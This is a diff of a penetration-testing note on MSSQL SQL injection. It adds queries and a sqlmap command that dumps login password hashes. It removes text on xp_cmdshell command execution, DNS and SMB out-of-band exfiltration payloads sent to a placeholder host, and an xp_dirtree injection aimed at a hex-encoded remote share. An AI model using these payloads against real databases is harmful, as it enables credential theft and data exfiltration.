@@ -47,8 +47,6 @@ in an unsafe manners, may not be properly detected by automatic tools.
 
 ### Databases dumping
 
-###### cheatsheet
-
 | Description | Queries |
 |-------------|---------|
 | Comments | |
@@ -56,53 +54,11 @@ in an unsafe manners, may not be properly detected by automatic tools.
 | Obfuscating queries | |
 | Disable logging mechanisms | |
 | MSSQL version | |
+| Current user | `SELECT (CAST(SYSTEM_USER AS NVARCHAR(4000)))` |
 | Users and privileges | |
-| Users' passwords | |
+| Users' passwords | Using `sqlmap`: <br> `sqlmap -D master -T sys.sql_logins --dump [...]` |
 | Databases | |
+| Current database | `SELECT (CAST(DB_NAME() AS NVARCHAR(4000)))` |
 | Tables | |
 | Columns | |
 | Data | |
-
-### OS access
-
-###### File system access
-
-`MSSQL` provides multiples ways to read files  
-
-###### Commands execution
-
-The `xp_cmdshell` extended procedure can be used to execute system commands
-given that the account making the queries has sufficient privileges on the SQL
-service. While the procedure can be disabled, it could be reneabled depending
-on the privileges of the account leveraged through the injection. Note that the
-Windows process spawned by `xp_cmdshell` has the same security rights as the
-SQL Server service account running the service.
-
-As with any stored procedure, `xp_cmdshell` needs to be called through stacked
-queries. For more information on how to execute commands through `xp_cmdshell`
-and how to leverage the execution into a reverse shell, refer to the
-`[L7] 1433 MSSQL` note.
-
-### Out-of-band data exfiltration
-
-| Description | Queries |
-|-------------|---------|
-| DNS request | `SELECT LOAD_FILE(concat('\\\\', (<SELECT_QUERY_ONE_ROW_RESULT>), '.<HOSTNAME>\\'))` |
-| SMB request | `SELECT <...> INTO OUTFILE '\\<HOSTNAME>\<SMB_SHARE>\<OUTPUT_FILE>'` |
-| HTTP requet | |
-
-
-###### System account
-
-###### Others
-
-Get current user
-1 AND 68 IN (SELECT (CAST(SYSTEM_USER AS NVARCHAR(4000))))
-
-Get current db name
-1 AND 3995 IN (SELECT (CAST(DB_NAME() AS NVARCHAR(4000))))
-
-SQLMAP Get password hash
-sqlmap -D master -T sys.sql_logins --dump
-
-1;DECLARE @fktn VARCHAR(8000);SET @fktn=0x5c5c31302e31302e31342e3133305c666f6f616161;EXEC master..xp_dirtree @fktn--
